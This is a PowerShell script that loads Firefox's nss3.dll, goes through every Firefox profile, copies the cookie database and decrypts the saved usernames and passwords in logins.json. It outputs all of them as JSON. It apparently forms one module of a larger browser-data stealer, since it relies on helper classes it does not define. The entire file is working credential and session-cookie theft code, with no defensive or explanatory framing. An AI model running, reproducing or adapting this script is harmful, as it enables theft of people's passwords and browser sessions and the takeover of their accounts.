# Add-Type -assembly System.Security
[System.reflection.assembly]::LoadWithPartialName("System.Security") > $null
[System.reflection.assembly]::LoadWithPartialName("System.IO") > $null



Function Get-DelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $False)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )
    $MyDelegateType = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MyDelegateType.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $MyDelegateType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $MyDelegateType.CreateType()
}

$data = [ordered]@{}


# Firefox decryptor
try {
    # Load nss3.dll
    $nssdllhandle = [IntPtr]::Zero

    $mozillapaths = $(
        "$env:HOMEDRIVE\Program Files\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files (x86)\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files\Nightly",
        "$env:HOMEDRIVE\Program Files (x86)\Nightly"
    )

    $mozillapath = ""
    foreach ($p in $mozillapaths) {
        if (Test-Path -path "$p\nss3.dll") {
            $mozillapath = $p
			break
        }
    }

    if ( ("$mozillapath" -ne "") -and (Test-Path -path "$mozillapath") ) {
        $nss3dll = "$mozillapath\nss3.dll"
        $mozgluedll = "$mozillapath\mozglue.dll"
        $msvcr120dll = "$mozillapath\msvcr120.dll"
        $msvcp120dll = "$mozillapath\msvcp120.dll"
        if(Test-Path $msvcr120dll) {
            $msvcr120dllHandle = [Win32]::LoadLibrary($msvcr120dll)
            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error when loading msvcr120.dll: $LastError"
        }

        if(Test-Path $msvcp120dll) {
            $msvcp120dllHandle = [Win32]::LoadLibrary($msvcp120dll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading msvcp120.dll: $LastError" 
        }

        if(Test-Path $mozgluedll) {
            $mozgluedllHandle = [Win32]::LoadLibrary($mozgluedll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last error loading mozglue.dll: $LastError"
        }
        
        if(Test-Path $nss3dll) {
            $nssdllhandle = [Win32]::LoadLibrary($nss3dll)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading nss3.dll: $LastError"       
        }
    }
    if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero)) {
        Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        Throw "Could not load nss3.dll"
    }
    # /Load nss3.dll

    # Create the ModuleBuilder
    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False)

    # Define SecItem Struct
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
    $StructBuilder.DefineField('type', [int], 'Public') > $null
    $StructBuilder.DefineField('data', [IntPtr], 'Public') > $null
    $StructBuilder.DefineField('len', [int], 'Public') > $null
    $SecItemType = $StructBuilder.CreateType()

    # $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((DynamicLoadDll "$mozillapath\nss3.dll" NSS_Init), (Get-DelegateType @([string]) ([long])))
    $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Init"), (Get-DelegateType @([string]) ([long])))
    $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Shutdown"), (Get-DelegateType @() ([long])))

    $PK11_GetInternalKeySlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_GetInternalKeySlot"), (Get-DelegateType @() ([long])))
    $PK11_FreeSlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_FreeSlot"), (Get-DelegateType @([long]) ([void])))
    $PK11_Authenticate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_Authenticate"), (Get-DelegateType @([long], [bool], [int]) ([long])))

    $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt"), (Get-DelegateType @([Type]$SecItemType.MakeByRefType(),[Type]$SecItemType.MakeByRefType(), [int]) ([int])))

}catch{
    $_
}

# https://github.com/Leslie-Shang/Browser_Decrypt/blob/master/Browser_Decrypt/Firefox_Decrypt.cpp
# https://github.com/techchrism/firefox-password-decrypt/blob/master/ConvertFrom-NSS.ps1
Function FFDecrypt-CipherText {
    param (
        [parameter(Mandatory=$True)]
        [string]$cipherText
    )
    $dataStr = ""
    $slot = $PK11_GetInternalKeySlot.Invoke()
    try{
        if ($PK11_Authenticate.Invoke($slot, $true, 0) -eq 0) {
            # Decode data into bytes and marshal them into a pointer
            $dataBytes = [System.Convert]::FromBase64String($cipherText)
            $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length) > $null

            # Set up structures
            $encrypted = [Activator]::CreateInstance($SecItemType)
            $encrypted.type = 0
            $encrypted.data = $dataPtr
            $encrypted.len = $dataBytes.Length

            $decrypted = [Activator]::CreateInstance($SecItemType)
            $decrypted.type = 0
            $decrypted.data = [IntPtr]::Zero
            $decrypted.len = 0

            $PK11SDR_Decrypt.Invoke([ref] $encrypted, [ref] $decrypted, 0) > $null

            # Get string data back out
            $bytePtr = $decrypted.data
            $byteData = [byte[]]::new($decrypted.len)
            [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len) > $null
            $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)
        }
    }catch{}
    $PK11_FreeSlot.Invoke($slot) > $null
    return $dataStr
}
# /Firefox decryptor

# Firefox
function Read-FirefoxCookies {
    param (
        $path
    )
    $_rows = [System.Collections.Generic.List[System.Collections.Generic.List[string]]]::new()
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"

    [sqliteDB] $db = [sqliteDB]::new($sDatabasePath, $false)
    $stmt = $db.prepareStmt("select host,name,value from moz_cookies")

    if (-not $stmt) {
        return @();
    }

    while ( $stmt.step()  -ne [WinSqlite]::DONE ) {
        [void]$_rows.Add(@(
            $stmt.col(0),
            $stmt.col(1),
            $stmt.col(2)
        ))
    }

    $stmt.finalize() > $null
    $db.close() > $null

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}

function Read-FirefoxLogins {
    param (
        $path
    )
    $_rows = [System.Collections.Generic.List[System.Collections.Generic.List[string]]]::new()

    $json = Get-Content "$path" | Out-String | ConvertFrom-Json
    foreach ($login in $json.logins) {
        $_item = @($login.hostname, "deuser err", "depass err", $login.formSubmitURL)
        try{
            $_item[1] = (FFDecrypt-CipherText $login.encryptedUsername)
        }catch{}
        try{
            $_item[2] = (FFDecrypt-CipherText $login.encryptedPassword)
        }catch{}
        $_rows.Add($_item) > $null
    }
    return $_rows
}

# Read dir
if (( -not ( ($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero) ) ) -and (Test-Path -path "$env:AppData\Mozilla\Firefox\Profiles") ) {
    $firefoxData = @{}
    $folders = Get-ChildItem -Name -Directory "$env:AppData\Mozilla\Firefox\Profiles"
    foreach ($_folder in $folders) {
        $NSSInitResult = $NSS_Init.Invoke("$env:AppData\Mozilla\Firefox\Profiles\$_folder")
        if ($NSSInitResult -ne 0) {
            Write-Warning "Could not init nss3.dll"
            continue
        }

        $firefoxData[$_folder] = @{}
        try{
            $firefoxData[$_folder]['cookies'] = Read-FirefoxCookies -path "$env:AppData\Mozilla\Firefox\Profiles\$_folder\cookies.sqlite"
        }catch{}
        try{
            $firefoxData[$_folder]['logins'] = Read-FirefoxLogins -path "$env:AppData\Mozilla\Firefox\Profiles\$_folder\logins.json"
        }catch{}
        # NSS_Shutdown
        $NSS_Shutdown.Invoke() > $null
    }
    $data['Firefox'] = $firefoxData

    if ($nssdllhandle) {
        [Win32]::FreeLibrary($nssdllhandle) > $null
    }
    if ($mozgluedllHandle) {
        [Win32]::FreeLibrary($mozgluedllHandle) > $null
    }
    if ($msvcp120dllHandle) {
        [Win32]::FreeLibrary($msvcp120dllHandle) > $null
    }
    if ($msvcr120dllHandle) {
        [Win32]::FreeLibrary($msvcr120dllHandle) > $null
    }
}
# Firefox

$data | ConvertTo-Json -Depth 9 # -Compress
